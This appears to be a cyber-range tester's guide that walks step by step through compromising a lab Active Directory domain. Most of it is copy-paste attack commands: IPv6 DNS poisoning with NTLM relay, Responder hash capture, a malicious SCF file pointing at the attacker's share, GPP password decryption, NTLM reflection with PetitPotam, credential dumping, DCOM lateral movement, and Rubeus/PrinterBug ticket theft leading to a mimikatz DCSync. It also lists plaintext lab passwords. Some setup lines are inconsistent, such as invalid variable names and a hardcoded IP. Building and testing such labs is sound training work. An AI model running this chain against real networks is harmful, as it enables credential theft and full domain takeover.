# SCENARIO 5: "PHANTOM RELAY" — Manual Red Team Testing Guide

> Copy-paste commands to test each step from Kali. Domain: corp.prabalurja.in / CORPPUL Entry point: svc-monitor:M0n!tor@PUL24

---

## SETUP: Set Your Variables

```bash
export KALI_IP=<your_kali_ip>
export dc-corpul=<dc-corpul_ip>
export srv-portal=<srv-srv-portal>
export srv-nas=<srv-srv-nas>
export srv-ci=<srv-srv-ci>
export srv-bastion=<srv-srv-bastion>
```

---

## STEP 0: ENTRY POINT — svc-monitor Enumeration

Players arrive with `svc-monitor:M0n!tor@PUL24` from the previous range.

### 0.1 — Verify svc-monitor creds work

```bash
nxc smb dc-corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in
```

Should show `[+]` (authenticated but not admin).

### 0.2 — LDAP enumeration with svc-monitor

```bash
# Enumerate all users
nxc ldap dc-corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --users

# Enumerate groups
nxc ldap dc-corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --groups

# Enumerate computers
nxc ldap dc-corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --computers
```

### 0.3 — SMB share enumeration

```bash
nxc smb srv-portal srv-nas srv-ci srv-bastion dc-corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --shares
```

### 0.4 — Check SMB signing (critical for Steps 1 and 3)

```bash
nxc smb srv-portal srv-nas srv-ci srv-bastion -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --gen-relay-list /tmp/relay_targets.txt
cat /tmp/relay_targets.txt
```

Should show all 4 member servers (SMB signing disabled). DC will NOT be in the list (signing enforced).

### 0.5 — Check for IPv6 (mitm6 prerequisite)

```bash
nxc smb srv-portal -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in -x "ipconfig"
```

Look for IPv6 addresses — Windows listens for IPv6 by default even in IPv4-only networks.

---

## STEP 1: mitm6 IPv6 DNS Takeover → NTLM Relay to LDAP

### 1.1 — Start ntlmrelayx targeting DC LDAP

**Terminal 1:**

```bash
impacket-ntlmrelayx -t ldaps://44.66.55.129 --no-smb-server --no-wcf-server --no-raw-server -6 -i
```

Or to write a specific ACL:

```bash
ntlmrelayx.py -t ldap://dc-corpul -wh attacker-wpad --escalate-user svc-monitor
```

### 1.2 — Start mitm6

**Terminal 2:**

```bash
sudo mitm6 -d corp.prabalurja.in -i eth0 --ignore-nofqdn \
  -hb DC-CORPUL \
  -hb DC-CORPUL.corp.prabalurja.in
```

### 1.3 — Wait for WPAD trigger

The WebHealthCheck task on SRV-PORTAL makes HTTP requests every 2 minutes. When mitm6 poisons IPv6 DNS, the WPAD lookup goes to Kali, triggering NTLM auth which gets relayed to DC LDAP.

Watch Terminal 1 for:

```
[*] HTTPD: Received connection from SRV-PORTAL$
[*] HTTPD: Client SRV-PORTAL$ has been relayed to ldap://dc-corpul
[*] Attempting to create computer account...

#you may need to update the NTLMrelay scripts to get LDAP working over SSL
#Then conned to the shell
nc 127.0.0.1 11000
change_password svc_file N3wF1l3P@ss!2025
```

### 1.4 — After relay succeeds, check what was written

```bash
# If delegate-access was used, check for new computer account:
nxc ldap dc-corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --computers

# Check if SRV-PORTAL$ has GenericAll on svc_file (pre-configured ACL):
bloodyAD -d corp.prabalurja.in -u svc-monitor -p 'M0n!tor@PUL24' --host dc-corpul get writable --detail 2>/dev/null | grep svc_file
```

### 1.5 — Reset svc_file password (using SRV-PORTAL$ relay or pre-configured ACL)

```bash
# svc-monitor can see that SRV-PORTAL$ has GenericAll on svc_file
# Use the relay session or any account with the right ACL to reset:
net rpc password svc_file 'N3wF1l3P@ss!2025' -U 'CORPPUL/svc-monitor%M0n!tor@PUL24' -S dc-corpul
```

If that fails (svc-monitor doesn't have the right), the relay from mitm6 should have given you the ability via SRV-PORTAL$ machine account permissions.

### 1.6 — Verify svc_file works

```bash
nxc smb srv-nas -u svc_file -p 'F1l3$3rv!c3#2025' -d corp.prabalurja.in --shares
```

Should show access to SYSVOLBackup and Data shares.

---

## TEST CONTINGENCY C1a: LLMNR/NBT-NS Poisoning

```bash
# Start Responder
sudo responder -I eth0 -wv
```

Wait up to 5 minutes. The LegacyBackupCheck task on SRV-PORTAL runs `net use \\FILESVR-OLD\backup` with svc_file creds every 5 min. Responder captures the NTLMv2 hash.

```bash
# Crack the hash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

Or create a custom wordlist with the known password format and crack.

## TEST CONTINGENCY C1b: SCF on DropBox Share

```bash
# Check if DropBox share is writable
smbclient //srv-portal/DropBox -N -c "ls"

# Create SCF file that forces NTLM auth
cat > /tmp/evil.scf << 'EOF'
[Shell]
Command=2
IconFile=\\KALI_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# Upload it
smbclient //srv-portal/DropBox -N -c "put /tmp/evil.scf @evil.scf"

# Start Responder and wait for someone to browse the share
sudo responder -I eth0 -wv
```

## TEST CONTINGENCY C1c: web.config.bak

```bash
curl -s http://srv-portal/web.config.bak
```

Should show svc_file password `F1l3$3rv!c3#2025`.

---

## STEP 2: GPP cpassword from SYSVOL Backup Share

### 2.1 — Access SYSVOLBackup share as svc_file

```bash
smbclient //srv-nas/SYSVOLBackup -U 'CORPPUL/svc_file%F1l3$3rv!c3#2025' -c "ls"
```

### 2.2 — Navigate to Groups.xml

```bash
smbclient //srv-nas/SYSVOLBackup -U 'CORPPUL/svc_file%F1l3$3rv!c3#2025' -c "cd Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups; get Groups.xml"
```

### 2.3 — Read the Groups.xml

```bash
cat Groups.xml
```

Look for the `cpassword` attribute in the XML.

### 2.4 — Decrypt the cpassword

```bash
gpp-decrypt "CPASSWORD_VALUE_HERE"
```

Should output: `Bu1ld$3rv!c3#2025`

### 2.5 — Verify svc_build creds work

```bash
nxc smb dc-corpul -u svc_build -p 'Bu1ld$3rv!c3#2025' -d corp.prabalurja.in
```

Should show `[+]`.

---

## TEST CONTINGENCY C2b: IT-Scripts Share

```bash
smbclient //srv-nas/IT-Scripts -U 'CORPPUL/svc_file%F1l3$3rv!c3#2025' -c "get deploy.ps1"
cat deploy.ps1 | grep -i password
```

Should show `Bu1ld$3rv!c3#2025` in the comments.

---

## STEP 3: CVE-2025-33073 NTLM Reflection → SYSTEM on SRV-CI

### 3.1 — Start ntlmrelayx targeting SRV-CI's own SMB

**Terminal 1:**

```bash
ntlmrelayx.py -t smb://srv-ci -smb2support -socks
```

Or for interactive shell:

```bash
ntlmrelayx.py -t smb://srv-ci -smb2support -i
```

### 3.2 — Add crafted DNS record via LDAP

**Terminal 2:**

```bash
python3 dnstool.py -u 'corp.prabalurja.in\svc_build' -p 'Bu1ld$3rv!c3#2025' \
    -a add \
    -r '1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.corp.prabalurja.in' \
    -d $KALI_IP \
    dc-corpul
```

### 3.3 — Coerce SRV-CI to authenticate to crafted name

**Terminal 3:**

```bash
python3 PetitPotam.py -u 'svc_build' -p 'Bu1ld$3rv!c3#2025' \
    $KALI_IP srv-ci
```

### 3.4 — Check ntlmrelayx output

Terminal 1 should show:

```
[*] Authenticating against smb://srv-ci as CORPPUL/SRV-CI$ SUCCEED
[*] AdminStatus: TRUE
[*] SOCKS: Adding CORPPUL/SRV-CI$@srv-ci to active SOCKS connections
```

### 3.5 — Dump credentials via SOCKS

```bash
proxychains secretsdump.py 'CORPPUL/SRV-CI$@'srv-ci -no-pass
```

Or if using interactive mode (`-i`):

```bash
nc 127.0.0.1 11000
# You now have a SYSTEM shell on SRV-CI
# Run: reg save HKLM\SAM C:\temp\SAM
# Run: reg save HKLM\SYSTEM C:\temp\SYSTEM
```

### 3.6 — Look for svc_admin hash in dump output

The secretsdump output should contain NTLM hashes for:

- `svc_admin` (from AdminMonitor scheduled task in LSASS)
- `svc_dadmin` (from DomainHealthCheck task — bonus DA hash)
- Local administrator

### 3.7 — Verify svc_admin hash works

```bash
nxc smb srv-bastion -u svc_admin -H 'NTLM_HASH_HERE' -d corp.prabalurja.in
```

Should show `[+] (Pwn3d!)` since svc_admin is local admin on SRV-BASTION.

### 3.8 — Clean up DNS record

```bash
python3 dnstool.py -u 'corp.prabalurja.in\svc_build' -p 'Bu1ld$3rv!c3#2025' \
    -a remove \
    -r '1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.corp.prabalurja.in' \
    dc-corpul
```

---

## TEST CONTINGENCY C3a: AlwaysInstallElevated

```bash
# Check from any shell on SRV-CI
nxc smb srv-ci -u svc_build -p 'Bu1ld$3rv!c3#2025' -d corp.prabalurja.in -x "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"
```

Should show `0x1`.

## TEST CONTINGENCY C3b: Unquoted Service Path

```bash
nxc smb srv-ci -u svc_build -p 'Bu1ld$3rv!c3#2025' -d corp.prabalurja.in -x "wmic service get name,pathname | findstr /v /i C:\Windows | findstr /v \"\""
```

Should show `CorpBuildTools` with unquoted path.

---

## STEP 4: DCOM Lateral Movement to SRV-BASTION

### 4.1 — DCOM command execution via MMC20.Application

```bash
# Using impacket dcomexec with svc_admin hash
impacket-dcomexec -object MMC20 'CORPPUL/svc_admin@'srv-bastion -hashes :NTLM_HASH_HERE
```

Or with cleartext password (if extracted from LSASS):

```bash
impacket-dcomexec -object MMC20 'CORPPUL/svc_admin:Adm1n$3rv!c3#2025@'srv-bastion
```

### 4.2 — Verify you have a shell

```cmd
whoami
hostname
```

Should show `corppul\svc_admin` on `SRV-BASTION`.

### 4.3 — Check for Unconstrained Delegation

```cmd
powershell -c "Get-ADComputer SRV-BASTION -Properties TrustedForDelegation | Select-Object TrustedForDelegation"
```

Should show `True`.

### 4.4 — Check Print Spooler is running (needed for Step 5)

```cmd
sc query Spooler
```

Should show `RUNNING` on SRV-BASTION.

Also verify Spooler on DC:

```cmd
powershell -c "Test-NetConnection dc-corpul -Port 445"
```

---

## TEST CONTINGENCY C4a: PSReadline History

```bash
nxc smb srv-bastion -u svc_admin -H 'NTLM_HASH_HERE' -d corp.prabalurja.in -x "type C:\Users\svc_admin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Should show commands containing `D@dm1n$3rv!c3#2025`.

## TEST CONTINGENCY C4b: Cached RDP Credentials

From shell on SRV-BASTION:

```cmd
dir C:\Users\svc_admin\AppData\Roaming\Microsoft\Credentials\ /a
```

Should show DPAPI credential blobs.

## TEST CONTINGENCY C4c: Writable Scheduled Task

```bash
nxc smb srv-bastion -u svc_admin -H 'NTLM_HASH_HERE' -d corp.prabalurja.in -x "schtasks /query /tn HealthMonitor /fo LIST /v"
```

Should show task running as `CORPPUL\svc_dadmin`.

```bash
nxc smb srv-bastion -u svc_admin -H 'NTLM_HASH_HERE' -d corp.prabalurja.in -x "icacls C:\HealthMonitor"
```

Should show `Authenticated Users` with `(M)` Modify.

---

## STEP 5: Unconstrained Delegation + PrinterBug → DC TGT → DCSync

### 5.1 — Upload Rubeus to SRV-BASTION

**Terminal on Kali:**

```bash
impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
```

**From DCOM shell on SRV-BASTION:**

```cmd
net use \\KALI_IP\share /user:att att
copy \\KALI_IP\share\Rubeus.exe C:\temp\Rubeus.exe
```

### 5.2 — Start Rubeus monitor for incoming TGTs

```cmd
C:\temp\Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC-CORPUL$
```

Leave this running.

### 5.3 — Trigger PrinterBug from Kali

**New terminal on Kali:**

```bash
# Using printerbug.py (from krbrelayx)
python3 printerbug.py 'corp.prabalurja.in/svc_admin:Adm1n$3rv!c3#2025'@dc-corpul srv-bastion
```

Or with hash:

```bash
python3 printerbug.py 'corp.prabalurja.in/svc_admin'@dc-corpul srv-bastion -hashes :NTLM_HASH_HERE
```

Or using SpoolSample:

```bash
# From the DCOM shell on SRV-BASTION (if SpoolSample.exe is uploaded):
C:\temp\SpoolSample.exe DC-CORPUL.corp.prabalurja.in SRV-BASTION.corp.prabalurja.in
```

### 5.4 — Rubeus captures DC-CORPUL$ TGT

Watch the Rubeus output. It should show:

```
[*] Captured TGT data for DC-CORPUL$:
    User          : DC-CORPUL$@CORP.PRABALURJA.IN
    StartTime     : ...
    EndTime       : ...
    Base64EncodedTicket : doIF...
```

### 5.5 — Use the captured TGT

**Option A: From Windows (Rubeus on SRV-BASTION):**

```cmd
C:\temp\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
```

Then DCSync:

```cmd
mimikatz.exe "lsadump::dcsync /domain:corp.prabalurja.in /user:Administrator" "exit"
```

**Option B: From Kali (convert and use with impacket):**

Save the base64 ticket to a file:

```bash
echo "BASE64_TICKET" | base64 -d > dc_tgt.kirbi

# Convert to ccache
impacket-ticketConverter dc_tgt.kirbi dc_tgt.ccache

# Set KRB5CCNAME
export KRB5CCNAME=dc_tgt.ccache

# DCSync
impacket-secretsdump -k -no-pass 'corp.prabalurja.in/DC-CORPUL$@DC-CORPUL.corp.prabalurja.in' -just-dc
```

### 5.6 — Verify domain compromise

The secretsdump output should contain:

- `Administrator` NTLM hash
- `krbtgt` NTLM hash
- All domain user hashes

```bash
# Test Administrator hash
nxc smb dc-corpul -u Administrator -H 'ADMIN_NTLM_HASH' -d corp.prabalurja.in
```

Should show `(Pwn3d!)`.

---

## TEST CONTINGENCY C5a: Server Operators

```bash
# svc_admin can add self to Server Operators
net rpc group addmem "Server Operators" "svc_admin" -U 'CORPPUL/svc_admin%Adm1n$3rv!c3#2025' -S dc-corpul

# Verify
nxc smb dc-corpul -u svc_admin -p 'Adm1n$3rv!c3#2025' -d corp.prabalurja.in -x "whoami /groups" | grep -i server
```

---

## CLEANUP AFTER TESTING

### Remove crafted DNS record (if not already done)

```bash
python3 dnstool.py -u 'corp.prabalurja.in\svc_build' -p 'Bu1ld$3rv!c3#2025' \
    -a remove -r '1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.corp.prabalurja.in' dc-corpul
```

### Reset svc_file password (if changed during Step 1)

On DC-CORPUL:

```powershell
Set-ADAccountPassword -Identity "svc_file" -Reset -NewPassword (ConvertTo-SecureString 'F1l3$3rv!c3#2025' -AsPlainText -Force)
```

### Remove svc_admin from Server Operators (if added via C5a)

```powershell
Remove-ADGroupMember -Identity "Server Operators" -Members "svc_admin" -Confirm:$false
```

### Delete uploaded tools on SRV-BASTION

```cmd
del /f /q C:\temp\Rubeus.exe C:\temp\SpoolSample.exe C:\temp\mimikatz.exe
net use * /delete /y
```

### Run cleanup script (next file)

```powershell
powershell -ExecutionPolicy Bypass -File Cleanup-Scenario5-Windows.ps1 -Force
```

---

## SUMMARY: What Each Test Proves

|Step|What You're Testing|Success Criteria|
|---|---|---|
|0|svc-monitor entry point|LDAP enum works, shares visible, SMB signing status known|
|1|mitm6 NTLM relay|SRV-PORTAL$ NTLM captured, relayed to DC LDAP|
|C1a|LLMNR poisoning|Responder captures svc_file NTLMv2 hash|
|C1b|SCF on writable share|SCF uploaded, NTLM auth triggered on browse|
|C1c|web.config.bak|svc_file password visible via HTTP|
|2|GPP cpassword|Groups.xml found, cpassword decrypted to svc_build|
|C2b|IT-Scripts share|svc_build password in script comments|
|3|CVE-2025-33073|NTLM reflected, SYSTEM on SRV-CI, svc_admin hash dumped|
|C3a|AlwaysInstallElevated|Registry key = 1|
|C3b|Unquoted service path|Service with unquoted path + writable dir|
|4|DCOM lateral|Shell on SRV-BASTION via MMC20, Unconstrained Delegation confirmed|
|C4a|PSReadline history|svc_dadmin password in history file|
|C4b|Cached RDP creds|DPAPI credential blobs exist|
|C4c|Writable sched task|HealthMonitor writable, runs as svc_dadmin|
|5|Unconstrained + PrinterBug|DC-CORPUL$ TGT captured, DCSync succeeds|
|C5a|Server Operators|svc_admin added to group successfully|